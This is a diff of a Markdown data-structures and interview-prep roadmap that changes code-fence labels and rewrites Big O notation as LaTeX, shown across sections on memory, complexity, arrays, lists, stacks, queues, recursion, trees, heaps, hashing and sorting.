@@ -4,9 +4,7 @@
 
 **Scope:** 53 concepts · 20 phases · connected step by step, with no artificial weekly deadline.
 
-```
 First principles → Systems → Design → Distributed → Hire
-```
 
 ---
 
@@ -60,7 +58,7 @@ Two notes on using this. If you are learning something for the first time, read 
 
 ## The Whole-Journey Map
 
-```
+```text
  PHASE 1                PHASE 2              PHASE 3                 PHASE 4
  PROGRAMMING            COMPLEXITY           LINEAR DATA             RECURSION
  FOUNDATIONS             ANALYSIS             STRUCTURES
@@ -154,7 +152,7 @@ Every arrow above is a real dependency that gets argued for in the text - not ju
 | 03 | [Linear Data Structures](#phase-3---linear-data-structures) | Store and access collections | Implement array-backed and linked-list-backed stacks/queues from scratch |
 | 04 | [Recursion](#phase-4---recursion) | Let structure branch | Write a correct base case on the first try, and trace a call stack by hand |
 | 05 | [Hierarchical & Priority Structures](#phase-5---hierarchical--priority-structures) | Model hierarchy and priority | Implement tree traversal, validate a BST, and solve a "top-k" problem with a heap |
-| 06 | [Hashing](#phase-6---hashing) | Answer "have I seen this" in O(1) | Reach for a hash map by instinct when you catch yourself writing a nested "have I seen this" loop |
+| 06 | [Hashing](#phase-6---hashing) | Answer "have I seen this" in $O(1)$ | Reach for a hash map by instinct when you catch yourself writing a nested "have I seen this" loop |
 | 07 | [Order: Sorting & Binary Search](#phase-7---order-sorting--binary-search) | Impose and exploit order | Implement merge sort by hand and explain why binary search needs sorted input |
 | 08 | [Graphs](#phase-8---graphs) | Model arbitrary relationships | Implement BFS and DFS from an adjacency list and know when to use each |
 | 09 | [Algorithmic Patterns](#phase-9---algorithmic-patterns) | Solve problems with repeated substructure or choices | Recognize when a brute-force recursive solution should become DP, and when greedy is provably correct |
@@ -207,7 +205,7 @@ A compiler is a translator that runs *once*, ahead of time, and emits a standalo
 
 **Internal Working, Step by Step (compiled path):**
 
-```
+```text
 your_program.c  --(compiler: lexing, parsing, optimization)-->  machine code (binary)
                                                                        |
                                                                        v
@@ -226,7 +224,7 @@ This split matters immediately: it's *why* a linked list (Phase 3) can grow one 
 
 **Diagram - the memory layout of a running process, drawn to scale of lifetime, not size:**
 
-```
+```text
  HIGH ADDRESSES
 +--------------------------------------+
 |              STACK                   |  local variables, function call frames
@@ -268,7 +266,7 @@ The stack is a spiral notebook you only ever write on the current page of: start
 | Compiled ahead of time | No translation cost at runtime; the optimizer gets to see the whole program | A build step before every run, and a binary that only works on the platform it was built for |
 | Interpreted | Instant start, no build step, same source runs anywhere the interpreter runs | Translation cost paid on every execution, so the same loop is measurably slower |
 | JIT compiled (hybrid) | Portable bytecode plus near-native speed on hot code paths | Slow first few seconds ("warm-up") and a much heavier runtime to ship |
-| Stack allocation | O(1) allocate and O(1) free, automatically, with no bookkeeping | Fixed total size, and the memory dies when the function returns |
+| Stack allocation | $O(1)$ allocate and $O(1)$ free, automatically, with no bookkeeping | Fixed total size, and the memory dies when the function returns |
 | Heap allocation | Size and lifetime decided at runtime; survives the function that created it | Allocation is far more expensive, and you (or a garbage collector) must track when it is free |
 
 **SMALL WORKING EXAMPLE**
@@ -335,24 +333,24 @@ To watch the compiled version of this idea, paste any small C function into [Com
 - Best animated explanation: [Big-O Notation - For Coding Interviews (NeetCode)](https://www.youtube.com/watch?v=BgLTDT03QtU)
 - Fast overview: [Big-O Notation in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=g2o22C3CRfU)
 - Another angle: [Learn Big O notation in 6 minutes (Bro Code)](https://www.youtube.com/watch?v=XMUe3zFhM5c)
-- Interactive simulator: [VisuAlgo - Sorting](https://visualgo.net/en/sorting) - watch the step-counter climb as array size grows, to *feel* O(n) vs O(n^2) instead of just reading it
+- Interactive simulator: [VisuAlgo - Sorting](https://visualgo.net/en/sorting) - watch the step-counter climb as array size grows, to *feel* $O(n)$ vs $O(n^2)$ instead of just reading it
 - Written documentation: [MIT OCW 6.006 - Introduction to Algorithms](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-spring-2020/) (Lectures 1-2 cover asymptotic analysis from first principles)
 - GitHub: [jwasham/coding-interview-university](https://github.com/jwasham/coding-interview-university) - "Algorithmic complexity / Big-O" section
 - Practice: [LeetCode](https://leetcode.com/) - every editorial states the intended Big O, so you can check your own analysis
 
 **STEP-BY-STEP EXPLANATION**
 
-Big O describes the *upper bound* on how an algorithm's running time (or memory use) grows as input size `n` grows, deliberately ignoring constant factors and hardware speed. `O(1)` means constant. `O(log n)` grows, but so slowly that doubling the input barely moves it. `O(n)` scales directly with input size. `O(n log n)` and `O(n^2)` grow faster still. Big O lets you compare two solutions *before* running either one on real data.
+Big O describes the *upper bound* on how an algorithm's running time (or memory use) grows as input size $n$ grows, deliberately ignoring constant factors and hardware speed. $O(1)$ means constant. $O(\log n)$ grows, but so slowly that doubling the input barely moves it. $O(n)$ scales directly with input size. $O(n\log n)$ and $O(n^2)$ grow faster still. Big O lets you compare two solutions *before* running either one on real data.
 
 **PICTURE IT LIKE THIS**
 
-Looking up a word in a physical dictionary cover-to-cover, page by page, is O(n). Flipping to roughly the middle, deciding "my word comes before this," and repeating on the remaining half is O(log n) - exactly how binary search works (Phase 7), and why a 1,000-page dictionary takes about 10 comparisons, not 1,000.
+Looking up a word in a physical dictionary cover-to-cover, page by page, is $O(n)$. Flipping to roughly the middle, deciding "my word comes before this," and repeating on the remaining half is $O(\log n)$ - exactly how binary search works (Phase 7), and why a 1,000-page dictionary takes about 10 comparisons, not 1,000.
 
 **Internal Working, Step by Step**
 
-A single `for` loop over `n` elements: the cost counter increments `n` times - O(n). Nest a second loop that also runs over the array: for every one of the `n` outer steps, the inner loop runs `n` more times, so the counter increments `n x n = n^2` times - O(n^2). Big O is just naming the shape of that counter's growth curve.
+A single `for` loop over `n` elements: the cost counter increments `n` times - $O(n)$. Nest a second loop that also runs over the array: for every one of the `n` outer steps, the inner loop runs `n` more times, so the counter increments $n\times n=n^2$ times - $O(n^2)$. Big O is just naming the shape of that counter's growth curve.
 
-```
+```text
 Time
  ^
  |                                        O(n^2)   (nested loops)
@@ -369,7 +367,7 @@ Time
 
 **Complexity Evolution - the pattern you'll see everywhere from here on**
 
-```
+```text
 Unsorted array, is-it-here?
 Search: O(n)   -- worst case, inspect every element
 
@@ -404,7 +402,7 @@ def quadratic_time(arr):       # O(n^2) - a loop nested inside a loop
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-An interviewer almost never asks "what is Big O" directly - they expect you to state the complexity of *your own solution*, unprompted, right after you write it. "This is O(n^2) because of the nested loop, and I can bring it down to O(n) using a hash map" in the same breath as your solution is one of the highest-signal moments in a technical interview.
+An interviewer almost never asks "what is Big O" directly - they expect you to state the complexity of *your own solution*, unprompted, right after you write it. "This is $O(n^2)$ because of the nested loop, and I can bring it down to $O(n)$ using a hash map" in the same breath as your solution is one of the highest-signal moments in a technical interview.
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
@@ -412,7 +410,7 @@ An interviewer almost never asks "what is Big O" directly - they expect you to s
 | --- | --- |
 | Easy | State the time/space complexity of a single loop that sums an array |
 | Medium | Compare two nested loops vs. two sequential (non-nested) loops over the same array |
-| Hard | Analyze naive recursive Fibonacci and explain why it's O(2^n) |
+| Hard | Analyze naive recursive Fibonacci and explain why it's $O(2^n)$ |
 
 **WHY THE NEXT TOPIC IS NEEDED - Linear Data Structures:** Big O gives you the ruler. Now you need something to measure - the simplest possible way to store a collection of values in memory. That's an array.
 
@@ -432,7 +430,7 @@ An interviewer almost never asks "what is Big O" directly - they expect you to s
 
 ## 3.1 Arrays & Strings
 
-**WHY YOU ARE LEARNING THIS:** An array solves a very specific problem: how do you store many values of the same kind so you can find any one of them instantly? The answer is contiguous memory - lay every element down next to its neighbor, in one unbroken block, so "find the 5th element" becomes pure arithmetic (`start address + 5 x element size`) instead of a search. Big O is what lets you *prove* that arithmetic trick is O(1) instead of just assuming it.
+**WHY YOU ARE LEARNING THIS:** An array solves a very specific problem: how do you store many values of the same kind so you can find any one of them instantly? The answer is contiguous memory - lay every element down next to its neighbor, in one unbroken block, so "find the 5th element" becomes pure arithmetic ($\text{start address}+5\times\text{element size}$) instead of a search. Big O is what lets you *prove* that arithmetic trick is $O(1)$ instead of just assuming it.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -446,30 +444,30 @@ An interviewer almost never asks "what is Big O" directly - they expect you to s
 
 **STEP-BY-STEP EXPLANATION**
 
-An array is a fixed-layout block of memory where every element sits at `base_address + index x element_size` O(1) random access. Strings are, inside the computer or system, arrays of characters, which is why the two most common interview patterns - **two pointers** and **sliding window** apply to both equally.
+An array is a fixed-layout block of memory where every element sits at `base_address + index x element_size` $O(1)$ random access. Strings are, inside the computer or system, arrays of characters, which is why the two most common interview patterns - **two pointers** and **sliding window** apply to both equally.
 
 **PICTURE IT LIKE THIS**
 
-A row of numbered parking spaces: told "the car is in space 42," you walk directly there. That's O(1) access. But if a car in space 10 leaves and you want no gaps, every car from 11 onward has to move down one space - the O(n) cost of deleting from the middle of an array.
+A row of numbered parking spaces: told "the car is in space 42," you walk directly there. That's $O(1)$ access. But if a car in space 10 leaves and you want no gaps, every car from 11 onward has to move down one space - the $O(n)$ cost of deleting from the middle of an array.
 
 **Internal Working, Step by Step** a sliding window across `[2, 1, 5, 1, 3, 2]`, window size 3:
 
-```
+```text
 [2, 1, 5] 1  3  2   -> sum = 8
  2 [1, 5, 1] 3  2   -> sum = 7   (slide right: subtract what left, add what entered)
  2  1 [5, 1, 3] 2   -> sum = 9
  2  1  5 [1, 3, 2]  -> sum = 6
 ```
-Each step reuses almost all of the previous sum instead of re-adding three numbers from scratch - the whole trick behind turning an O(n*k) brute force into an O(n) sliding window.
+Each step reuses almost all of the previous sum instead of re-adding three numbers from scratch - the whole trick behind turning an $O(n\cdot k)$ brute force into an $O(n)$ sliding window.
 
 **HOW THE TIME AND MEMORY USE GROW**
 
 | Operation | Array | Notes |
 | --- | --- | --- |
-| Access by index | O(1) | direct address arithmetic |
-| Search (unsorted) | O(n) | must check each element |
-| Insert/delete at end | O(1) amortized | no shifting needed |
-| Insert/delete in middle | O(n) | every following element must shift |
+| Access by index | $O(1)$ | direct address arithmetic |
+| Search (unsorted) | $O(n)$ | must check each element |
+| Insert/delete at end | $O(1)$ amortized | no shifting needed |
+| Insert/delete in middle | $O(n)$ | every following element must shift |
 
 **SMALL WORKING EXAMPLE**
 
@@ -485,7 +483,7 @@ def max_sliding_window_sum(arr, k):
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-Arrays and strings are where interviewers check whether you reach for O(n) tools (two pointers, sliding window, prefix sums) by instinct, or default to an O(n^2) brute force. Naming the pattern out loud before you code is a strong signal.
+Arrays and strings are where interviewers check whether you reach for $O(n)$ tools (two pointers, sliding window, prefix sums) by instinct, or default to an $O(n^2)$ brute force. Naming the pattern out loud before you code is a strong signal.
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
@@ -501,7 +499,7 @@ Arrays and strings are where interviewers check whether you reach for O(n) tools
 
 ## 3.2 Linked Lists
 
-**WHY YOU ARE LEARNING THIS:** Arrays gave you O(1) access but O(n) middle-insertion, because shifting elements is the price of contiguity. A linked list gives up contiguity: each element (a "node") stores a pointer to where the next one lives - these nodes live on the heap from Phase 1, scattered, not contiguous. Insertion and deletion become O(1) *once you're at the right spot*, because you're only rewiring two pointers - nothing has to move.
+**WHY YOU ARE LEARNING THIS:** Arrays gave you $O(1)$ access but $O(n)$ middle-insertion, because shifting elements is the price of contiguity. A linked list gives up contiguity: each element (a "node") stores a pointer to where the next one lives - these nodes live on the heap from Phase 1, scattered, not contiguous. Insertion and deletion become $O(1)$ *once you're at the right spot*, because you're only rewiring two pointers - nothing has to move.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -515,7 +513,7 @@ Arrays and strings are where interviewers check whether you reach for O(n) tools
 
 **STEP-BY-STEP EXPLANATION**
 
-A singly linked list is a chain of nodes; each holds a value and a pointer to the next node. There's no `base_address + index` trick, so random access degrades to O(n). What you buy in exchange is O(1) insertion/deletion *at a known position*.
+A singly linked list is a chain of nodes; each holds a value and a pointer to the next node. There's no `base_address + index` trick, so random access degrades to $O(n)$. What you buy in exchange is $O(1)$ insertion/deletion *at a known position*.
 
 **PICTURE IT LIKE THIS**
 
@@ -523,7 +521,7 @@ A scavenger hunt: each clue tells you only where to find the *next* clue. You ca
 
 **Internal Working, Step by Step**
 
-```
+```text
 ARRAY (contiguous memory)          LINKED LIST (scattered memory)
 +----+----+----+----+----+         +----+----+   +----+----+   +----+------+
 | 10 | 20 | 30 | 40 | 50 |         | 10 | *--+-->| 20 | *--+-->| 30 | NULL |
@@ -536,9 +534,9 @@ To reverse a linked list, walk it once, and at each node flip its pointer to fac
 
 | Operation | Linked List | Array |
 | --- | --- | --- |
-| Access by index | O(n) | O(1) |
-| Insert/delete at known node | O(1) | O(n) |
-| Search | O(n) | O(n) |
+| Access by index | $O(n)$ | $O(1)$ |
+| Insert/delete at known node | $O(1)$ | $O(n)$ |
+| Search | $O(n)$ | $O(n)$ |
 | Extra memory per element | pointer overhead | none |
 
 **SMALL WORKING EXAMPLE**
@@ -574,7 +572,7 @@ Linked-list problems are chosen because pointer bugs are easy to spot: losing th
 | Medium | Remove Nth Node From End of List |
 | Hard | Merge k Sorted Lists |
 
-**WHY THE NEXT TOPIC IS NEEDED - Stacks:** A linked list lets you insert and delete anywhere in O(1), but most real problems don't need "anywhere" - they need a strict, disciplined order of access. The first and simplest such order is "whatever went in last comes out first."
+**WHY THE NEXT TOPIC IS NEEDED - Stacks:** A linked list lets you insert and delete anywhere in $O(1)$, but most real problems don't need "anywhere" - they need a strict, disciplined order of access. The first and simplest such order is "whatever went in last comes out first."
 
 ## 3.3 Stacks
 
@@ -591,7 +589,7 @@ Linked-list problems are chosen because pointer bugs are easy to spot: losing th
 
 **STEP-BY-STEP EXPLANATION**
 
-A stack supports `push` (add to top) and `pop` (remove from top), both O(1). There is no O(1) way to reach into the middle - that restriction *is* the feature: whatever you look at is always the most recently added item.
+A stack supports `push` (add to top) and `pop` (remove from top), both $O(1)$. There is no $O(1)$ way to reach into the middle - that restriction *is* the feature: whatever you look at is always the most recently added item.
 
 **PICTURE IT LIKE THIS**
 
@@ -599,7 +597,7 @@ A stack of plates: always place a new plate on top, always take the top one off 
 
 **Internal Working, Step by Step**
 
-```
+```text
  push(D)                    pop()
  +---+                     +---+
  | D | <- top                | C | <- D removed, C is now top
@@ -616,10 +614,10 @@ A stack of plates: always place a new plate on top, always take the top one off 
 
 | Operation | Cost |
 | --- | --- |
-| push | O(1) |
-| pop | O(1) |
-| peek | O(1) |
-| search for arbitrary element | O(n) |
+| push | $O(1)$ |
+| pop | $O(1)$ |
+| peek | $O(1)$ |
+| search for arbitrary element | $O(n)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -645,7 +643,7 @@ Stacks are expected for anything with nested or "most-recent-first" structure: p
 | --- | --- |
 | Easy | Valid Parentheses |
 | Easy | Implement Queue using Stacks |
-| Medium | Min Stack (O(1) getMin) |
+| Medium | Min Stack ($O(1)$ getMin) |
 | Medium | Daily Temperatures (monotonic stack) |
 | Hard | Largest Rectangle in Histogram |
 
@@ -666,7 +664,7 @@ Stacks are expected for anything with nested or "most-recent-first" structure: p
 
 **STEP-BY-STEP EXPLANATION**
 
-A queue supports `enqueue` (rear) and `dequeue` (front), both O(1) when backed by a circular buffer or a linked list with head *and* tail pointers - a plain array would force an O(n) shift on every dequeue.
+A queue supports `enqueue` (rear) and `dequeue` (front), both $O(1)$ when backed by a circular buffer or a linked list with head *and* tail pointers - a plain array would force an $O(n)$ shift on every dequeue.
 
 **PICTURE IT LIKE THIS**
 
@@ -674,7 +672,7 @@ A grocery checkout line: join at the back, the cashier serves whoever has waited
 
 **Internal Working, Step by Step**
 
-```
+```text
 enqueue(D)                          dequeue()
 +---+---+---+---+                   +---+---+---+
 | A | B | C | D |                   | B | C | D |  <- A removed, B is new front
@@ -686,10 +684,10 @@ front           rear                 front       rear
 
 | Operation | Cost (linked-list or circular-buffer backed) |
 | --- | --- |
-| enqueue | O(1) |
-| dequeue | O(1) |
-| peek (front) | O(1) |
-| search for arbitrary element | O(n) |
+| enqueue | $O(1)$ |
+| dequeue | $O(1)$ |
+| peek (front) | $O(1)$ |
+| search for arbitrary element | $O(n)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -762,7 +760,7 @@ Russian nesting dolls: open the outermost, then the one inside, then the one ins
 
 **Internal Working, Step by Step**
 
-```
+```text
 factorial(4)
  +- 4 * factorial(3)
      +- 3 * factorial(2)
@@ -780,9 +778,9 @@ Each downward arrow is a real stack frame being pushed onto the call stack from 
 
 | Aspect | Cost |
 | --- | --- |
-| Time (naive Fibonacci) | O(2^n) - recomputes overlapping subproblems (fixed in Phase 9 by Dynamic Programming) |
-| Time (single-path recursion, e.g. factorial) | O(n) |
-| Space | O(depth of recursion) - every waiting call occupies a stack frame |
+| Time (naive Fibonacci) | $O(2^n)$ - recomputes overlapping subproblems (fixed in Phase 9 by Dynamic Programming) |
+| Time (single-path recursion, e.g. factorial) | $O(n)$ |
+| Space | $O(\text{recursion depth})$ - every waiting call occupies a stack frame |
 
 **SMALL WORKING EXAMPLE**
 
@@ -849,7 +847,7 @@ A company org chart: CEO is the root, VPs are children, directors are children o
 
 **Internal Working, Step by Step**
 
-```
+```text
         A
       /   \
      B     C
@@ -865,8 +863,8 @@ Postorder (left, right, node):  D, E, B, C, A
 
 | Operation | Cost |
 | --- | --- |
-| Traverse all n nodes (any order) | O(n) |
-| Extra space (recursion stack) | O(h), h = tree height |
+| Traverse all n nodes (any order) | $O(n)$ |
+| Extra space (recursion stack) | $O(h)$, where $h$ is the tree height |
 
 **SMALL WORKING EXAMPLE**
 
@@ -896,11 +894,11 @@ Tree problems test whether recursion has clicked - nearly every tree question ("
 | Medium | Binary Tree Level Order Traversal |
 | Hard | Serialize and Deserialize a Binary Tree |
 
-**WHY THE NEXT TOPIC IS NEEDED - BSTs:** A plain tree gives hierarchy but no guarantee about *where* a value lives - finding something means checking every node, O(n). What if one simple ordering rule turned "is this value here" into a series of yes/no turns instead of a full search?
+**WHY THE NEXT TOPIC IS NEEDED - BSTs:** A plain tree gives hierarchy but no guarantee about *where* a value lives - finding something means checking every node, $O(n)$. What if one simple ordering rule turned "is this value here" into a series of yes/no turns instead of a full search?
 
 ## 5.2 Binary Search Trees (BST)
 
-**WHY YOU ARE LEARNING THIS:** A plain tree has no ordering rule, so searching is O(n) - no better than a linked list. A BST adds one constraint: every left subtree holds smaller values, every right subtree holds larger ones. That rule turns "is this value in the tree" from a full scan into repeated halving - the same divide-and-conquer idea from Binary Search (Phase 7), baked directly into the data's shape.
+**WHY YOU ARE LEARNING THIS:** A plain tree has no ordering rule, so searching is $O(n)$ - no better than a linked list. A BST adds one constraint: every left subtree holds smaller values, every right subtree holds larger ones. That rule turns "is this value in the tree" from a full scan into repeated halving - the same divide-and-conquer idea from Binary Search (Phase 7), baked directly into the data's shape.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -913,7 +911,7 @@ Tree problems test whether recursion has clicked - nearly every tree question ("
 
 **STEP-BY-STEP EXPLANATION**
 
-In a BST, every node satisfies: `left subtree < node < right subtree`. Searching compares the target to the current node and goes left or right - each step eliminates roughly half the remaining nodes, giving O(log n) search *if the tree is balanced*. In-order traversal of a BST always produces sorted values, for free.
+In a BST, every node satisfies: $\text{left subtree}<\text{node}<\text{right subtree}$. Searching compares the target to the current node and goes left or right - each step eliminates roughly half the remaining nodes, giving $O(\log n)$ search *if the tree is balanced*. In-order traversal of a BST always produces sorted values, for free.
 
 **PICTURE IT LIKE THIS**
 
@@ -921,7 +919,7 @@ A "higher or lower" guessing game baked directly into the data: at every node, o
 
 **Internal Working, Step by Step**
 
-```
+```text
               (50)
              /    \
           (30)     (70)
@@ -936,9 +934,9 @@ In-order traversal: 20, 30, 40, 50, 60, 70, 80  -> always sorted
 
 | Operation | Balanced BST | Unbalanced (worst case, e.g. sorted insert order) |
 | --- | --- | --- |
-| Search | O(log n) | O(n) - degenerates into a linked list |
-| Insert | O(log n) | O(n) |
-| Delete | O(log n) | O(n) |
+| Search | $O(\log n)$ | $O(n)$ - degenerates into a linked list |
+| Insert | $O(\log n)$ | $O(n)$ |
+| Delete | $O(\log n)$ | $O(n)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -966,7 +964,7 @@ def search_bst(node, target):
 
 ## 5.3 Heaps / Priority Queues
 
-**WHY YOU ARE LEARNING THIS:** A BST is built for general search - any value, anywhere. A heap narrows its ambition on purpose: it gives up general search entirely and optimizes for one repeated question - "what's the smallest (or largest) element right now?" - answering it in O(1), with O(log n) insert/remove. Exactly right for "top-k," "k closest," and "process the most urgent thing first" problems.
+**WHY YOU ARE LEARNING THIS:** A BST is built for general search - any value, anywhere. A heap narrows its ambition on purpose: it gives up general search entirely and optimizes for one repeated question - "what's the smallest (or largest) element right now?" - answering it in $O(1)$, with $O(\log n)$ insert/remove. Exactly right for "top-k," "k closest," and "process the most urgent thing first" problems.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -979,7 +977,7 @@ def search_bst(node, target):
 
 **STEP-BY-STEP EXPLANATION**
 
-A binary heap is a complete binary tree (filled level by level, left to right) stored compactly in a plain array - a node at index `i` has children at `2i+1` and `2i+2`. A min-heap guarantees every parent is smaller than its children, so the smallest element sits at the root - index 0 - readable in O(1).
+A binary heap is a complete binary tree (filled level by level, left to right) stored compactly in a plain array - a node at index $i$ has children at $2i+1$ and $2i+2$. A min-heap guarantees every parent is smaller than its children, so the smallest element sits at the root - index 0 - readable in $O(1)$.
 
 **PICTURE IT LIKE THIS**
 
@@ -987,7 +985,7 @@ A hospital emergency room: patients aren't seen in arrival order (that's a queue
 
 **Internal Working, Step by Step**
 
-```
+```text
 Tree view (min-heap):        Array view:
         (5)                   [5, 8, 7, 20, 15, 9]
        /   \                    0  1  2   3   4  5
@@ -1004,10 +1002,10 @@ repeatedly while it's smaller, until the min-heap rule is restored.
 
 | Operation | Cost |
 | --- | --- |
-| Peek min/max | O(1) |
-| Insert | O(log n) |
-| Extract min/max | O(log n) |
-| Build heap from n elements | O(n) |
+| Peek min/max | $O(1)$ |
+| Insert | $O(\log n)$ |
+| Extract min/max | $O(\log n)$ |
+| Build heap from n elements | $O(n)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1025,7 +1023,7 @@ def k_largest(nums, k):
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-"Top k," "k closest," "kth largest," or "running median" should make a heap the first tool you reach for - reaching for a full sort (O(n log n)) when a heap gets you O(n log k) is a common, noticeable miss.
+"Top k," "k closest," "kth largest," or "running median" should make a heap the first tool you reach for - reaching for a full sort ($O(n\log n)$) when a heap gets you $O(n\log k)$ is a common, noticeable miss.
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
@@ -1037,7 +1035,7 @@ def k_largest(nums, k):
 | Hard | Find Median from Data Stream (two heaps) |
 | Hard | Merge k Sorted Lists (revisit from Phase 3 with a heap) |
 
-**WHY THE NEXT TOPIC IS NEEDED - Hashing:** A heap answers "what's the smallest/largest" instantly. A huge class of problems asks a completely different question: "have I seen this exact value before?" Neither a BST nor a heap answers that in O(1) - searching either still costs at least O(log n).
+**WHY THE NEXT TOPIC IS NEEDED - Hashing:** A heap answers "what's the smallest/largest" instantly. A huge class of problems asks a completely different question: "have I seen this exact value before?" Neither a BST nor a heap answers that in $O(1)$ - searching either still costs at least $O(\log n)$.
 
 ---
 
@@ -1049,13 +1047,13 @@ def k_largest(nums, k):
 
 **Track:** Data Structures & Algorithms
 
-**WHAT YOU WILL BE ABLE TO DO:** Answer "have I seen this before" in average O(1), by computing an address instead of comparing values.
+**WHAT YOU WILL BE ABLE TO DO:** Answer "have I seen this before" in average $O(1)$, by computing an address instead of comparing values.
 
 **WHAT YOU SHOULD KNOW FIRST:** Phase 5 (contrast with tree/heap search costs).
 
 ## 6.1 Hash Tables
 
-**WHY YOU ARE LEARNING THIS:** Every structure so far - array, linked list, tree, heap - answers "is X here" by comparing X to other values, costing at least O(log n) even in the best case. A hash table sidesteps comparison entirely: it runs a **hash function** on the key to compute exactly where it should live, the same way an array computes an address from an index. That's what gives it average O(1) lookup, insert, and delete - arguably the single most-used data structure in real interview solutions.
+**WHY YOU ARE LEARNING THIS:** Every structure so far - array, linked list, tree, heap - answers "is X here" by comparing X to other values, costing at least $O(\log n)$ even in the best case. A hash table sidesteps comparison entirely: it runs a **hash function** on the key to compute exactly where it should live, the same way an array computes an address from an index. That's what gives it average $O(1)$ lookup, insert, and delete - arguably the single most-used data structure in real interview solutions.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -1069,7 +1067,7 @@ def k_largest(nums, k):
 
 **STEP-BY-STEP EXPLANATION**
 
-A hash table stores key-value pairs in an array of "buckets." A hash function converts each key into a bucket index; two keys hashing to the same bucket ("a collision") are chained together in a small list at that bucket. As long as the hash function spreads keys evenly and the table resizes as it fills, the average bucket holds close to one item, giving O(1) average-case operations.
+A hash table stores key-value pairs in an array of "buckets." A hash function converts each key into a bucket index; two keys hashing to the same bucket ("a collision") are chained together in a small list at that bucket. As long as the hash function spreads keys evenly and the table resizes as it fills, the average bucket holds close to one item, giving $O(1)$ average-case operations.
 
 **PICTURE IT LIKE THIS**
 
@@ -1077,7 +1075,7 @@ A theater coat-check: instead of searching every hook for your coat, the attenda
 
 **Internal Working, Step by Step**
 
-```
+```text
 key "dog"  -> hash() -> 0     +---+-------------------------+
 key "cat"  -> hash() -> 2     | 0 | "dog" -> 12              |
 key "bird" -> hash() -> 2     | 1 | (empty)                  |
@@ -1091,9 +1089,9 @@ Average case: O(1) lookup/insert.  Worst case (many collisions): O(n)
 
 | Operation | Average | Worst Case (heavy collisions) |
 | --- | --- | --- |
-| Insert | O(1) | O(n) |
-| Lookup | O(1) | O(n) |
-| Delete | O(1) | O(n) |
+| Insert | $O(1)$ | $O(n)$ |
+| Lookup | $O(1)$ | $O(n)$ |
+| Delete | $O(1)$ | $O(n)$ |
 
 **SMALL WORKING EXAMPLE**
 
@@ -1106,23 +1104,23 @@ def group_anagrams(words):
     return list(groups.values())
 ```
 
-**Trade-offs:** average O(1) speed costs extra memory (the underlying array is kept intentionally sparse to keep collisions rare), gives up ordering entirely (iterate one and values come out in no particular sequence), and its worst case degrades badly if the hash function is poor or an attacker can choose keys that collide on purpose.
+**Trade-offs:** average $O(1)$ speed costs extra memory (the underlying array is kept intentionally sparse to keep collisions rare), gives up ordering entirely (iterate one and values come out in no particular sequence), and its worst case degrades badly if the hash function is poor or an attacker can choose keys that collide on purpose.
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
 
-The single most common upgrade path in an interview is "brute force with nested loops (O(n^2)) -> hash map (O(n))." The moment you think "I need to check if I've seen this before," say "hash set" or "hash map" out loud.
+The single most common upgrade path in an interview is "brute force with nested loops ($O(n^2)$) -> hash map ($O(n)$)." The moment you think "I need to check if I've seen this before," say "hash set" or "hash map" out loud.
 
 **PRACTICE UNTIL IT FEELS FAMILIAR**
 
 | Difficulty | Problem |
 | --- | --- |
-| Easy | Two Sum (hash map version - revisit Phase 3, now O(n)) |
+| Easy | Two Sum (hash map version - revisit Phase 3, now $O(n)$) |
 | Easy | Contains Duplicate |
 | Medium | Group Anagrams |
 | Medium | Longest Consecutive Sequence |
 | Hard | LRU Cache (hash map + doubly linked list) |
 
-**WHY THE NEXT TOPIC IS NEEDED - Sorting:** A hash table gives O(1) lookup but no ordering whatsoever. Plenty of problems genuinely need order (find the median, remove duplicates from a range, binary search), and the tool for imposing order on a collection is sorting.
+**WHY THE NEXT TOPIC IS NEEDED - Sorting:** A hash table gives $O(1)$ lookup but no ordering whatsoever. Plenty of problems genuinely need order (find the median, remove duplicates from a range, binary search), and the tool for imposing order on a collection is sorting.
 
 ---
 
@@ -1153,7 +1151,7 @@ The single most common upgrade path in an interview is "brute force with nested 
 
 **STEP-BY-STEP EXPLANATION**
 
-Merge sort splits the array in half recursively (down to single elements, trivially sorted), then merges sorted halves back together in linear time per level - O(n log n) overall, and the direct blueprint for the "divide, solve, combine" thinking reused in Dynamic Programming (Phase 9). Quick sort picks a "pivot," partitions smaller-left/larger-right, then recurses on each side.
+Merge sort splits the array in half recursively (down to single elements, trivially sorted), then merges sorted halves back together in linear time per level - $O(n\log n)$ overall, and the direct blueprint for the "divide, solve, combine" thinking reused in Dynamic Programming (Phase 9). Quick sort picks a "pivot," partitions smaller-left/larger-right, then recurses on each side.
 
 **PICTURE IT LIKE THIS**
 
@@ -1161,7 +1159,7 @@ Merging two already-sorted piles of exam papers: compare the top paper of each p
 
 **Internal Working, Step by Step**
 
-```
+```text
 Merge step, merging [1,4,7] and [2,3,9]:
 compare 1,2 -> take 1   -> [1]
 compare 4,2 -> take 2   -> [1,2]
@@ -1175,11 +1173,11 @@ nothing left in left pile -> take remaining 9 -> [1,2,3,4,7,9]
 
 | Algorithm | Best | Average | Worst | Space | Stable? |
 | --- | --- | --- | --- | --- | --- |
-| Bubble Sort | O(n) | O(n^2) | O(n^2) | O(1) | Yes |
-| Insertion Sort | O(n) | O(n^2) | O(n^2) | O(1) | Yes |
-| Merge Sort | O(n log n) | O(n log n) | O(n log n) | O(n) | Yes |
-| Quick Sort | O(n log n) | O(n log n) | O(n^2) | O(log n) | No |
-| Heap Sort | O(n log n) | O(n log n) | O(n log n) | O(1) | No |
+| Bubble Sort | $O(n)$ | $O(n^2)$ | $O(n^2)$ | $O(1)$ | Yes |
+| Insertion Sort | $O(n)$ | $O(n^2)$ | $O(n^2)$ | $O(1)$ | Yes |
